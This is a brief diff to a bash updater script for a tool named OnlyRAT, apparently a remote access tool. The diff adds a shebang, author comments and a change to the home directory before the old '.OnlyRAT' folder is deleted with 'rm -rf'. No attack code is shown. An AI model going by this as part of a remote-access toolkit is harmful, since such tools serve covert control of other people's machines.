@@ -1,4 +1,9 @@
+#!/bin/bash
+# updater for OnlyRAT
+# created by : C0SM0
+
 # remove previous version
+cd ~
 rm -rf .OnlyRAT
 
 # install new version
